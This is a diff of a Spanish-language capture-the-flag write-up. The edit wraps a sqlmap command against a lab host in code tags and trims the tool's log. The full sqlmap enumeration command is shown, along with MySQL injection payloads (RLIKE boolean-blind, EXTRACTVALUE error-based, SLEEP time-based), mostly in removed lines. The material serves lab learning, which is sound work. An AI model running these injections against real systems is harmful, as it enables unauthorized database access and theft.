@@ -130,6 +130,8 @@ De esta forma conseguimos las credenciales para poder loguearnos en el panel de 
 
 Bien lo siguiente que haremos será dar uso de SQLmap para intentar conseguir bases de datos existentes usaremos el siguiente comando.
 
+<pre>
+  <code>
 ❯ sqlmap -u "http://10.88.0.2/app.php" --data="note=" -p note --cookie="PHPSESSID=g32ujngur7l9uh62fb37id280u" --dbs --batch --keep-alive
         ___
        __H__
@@ -147,66 +149,7 @@ Bien lo siguiente que haremos será dar uso de SQLmap para intentar conseguir ba
 [14:16:38] [INFO] testing if the target URL content is stable
 [14:16:39] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
 how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
-[14:16:39] [INFO] heuristic (basic) test shows that POST parameter 'note' might be injectable (possible DBMS: 'MySQL')
-[14:16:39] [INFO] testing for SQL injection on POST parameter 'note'
-it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
-[14:16:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[14:16:39] [WARNING] reflective value(s) found and filtering out
-[14:16:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[14:16:39] [INFO] testing 'Generic inline queries'
-[14:16:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
-[14:16:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
-[14:16:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
-[14:16:40] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
-[14:16:40] [INFO] POST parameter 'note' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
-[14:16:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
-[14:16:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
-[14:16:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
-[14:16:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
-[14:16:40] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
-[14:16:40] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
-[14:16:40] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
-[14:16:40] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
-[14:16:40] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
-[14:16:40] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
-[14:16:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
-[14:16:40] [INFO] POST parameter 'note' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
-[14:16:40] [INFO] testing 'MySQL inline queries'
-[14:16:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
-[14:16:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
-[14:16:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
-[14:16:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
-[14:16:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
-[14:16:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
-[14:16:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
-[14:16:50] [INFO] POST parameter 'note' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
-[14:16:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[14:16:50] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[14:16:50] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
-[14:16:50] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
-[14:16:50] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
-[14:16:50] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
-[14:16:50] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
-[14:16:50] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
-[14:16:50] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
-[14:16:51] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
-[14:16:51] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
-[14:16:51] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
-POST parameter 'note' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 414 HTTP(s) requests:
----
-Parameter: note (POST)
-    Type: boolean-based blind
-    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
-    Payload: note=' RLIKE (SELECT (CASE WHEN (6740=6740) THEN '' ELSE 0x28 END)) AND 'lnBD'='lnBD
 
-    Type: error-based
-    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
-    Payload: note=' AND EXTRACTVALUE(3394,CONCAT(0x5c,0x7176767871,(SELECT (ELT(3394=3394,1))),0x716b716a71)) AND 'OhtG'='OhtG
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: note=' AND (SELECT 7646 FROM (SELECT(SLEEP(5)))JadM) AND 'ZGlQ'='ZGlQ
 ---
 [14:16:51] [INFO] the back-end DBMS is MySQL
@@ -222,8 +165,9 @@ available databases [2]:
 
 [14:16:51] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.88.0.2'
 [14:16:51] [WARNING] your sqlmap version is outdated
+  </code>
+</pre>
 
-[*] ending @ 14:16:51 /2026-01-25/
 
 
 
